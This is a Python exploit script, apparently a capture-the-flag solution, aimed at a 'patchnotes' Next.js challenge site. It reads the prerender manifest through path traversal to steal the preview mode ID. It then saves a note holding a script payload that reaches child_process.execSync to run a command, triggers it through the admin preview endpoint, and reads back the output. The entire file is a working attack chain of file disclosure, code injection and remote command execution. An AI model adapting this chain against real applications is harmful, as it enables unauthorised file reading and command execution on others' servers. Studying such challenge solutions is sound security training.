import requests

URL = "https://patchnotes-web.challs3.infobahnc.tf/"

def fetch_preview_id():
    file_path = "../../../../app/.next/prerender-manifest.json"
    response = requests.get(URL + "/api/notes/read?file=" +file_path)
    preview_id = response.json()["json"]["preview"]["previewModeId"]
    return preview_id

def get_flag():
    cmd = "/readflag > /tmp/data/flag.json"
    payload = f"<script> const process = this.constructor.constructor('return process')(); const require = process.mainModule.require; console.log('Files:', require('child_process').execSync('{cmd}')); </script>"
    data = {
        "file": "patch-1.0.3.json",
        "content": payload,
    }
    requests.post(URL + f"/api/notes/save", json=data)
    header = {
        "X-Prerender-Revalidate": fetch_preview_id()
    }
    requests.post(URL + f"/admin/api/preview", json={"file": "patch-1.0.3.json"}, headers=header)
    flag_response = requests.get(URL + "/api/notes/read?file=flag.json")
    print("Flag:", flag_response.json()["content"])

if __name__ == "__main__":
    get_flag()
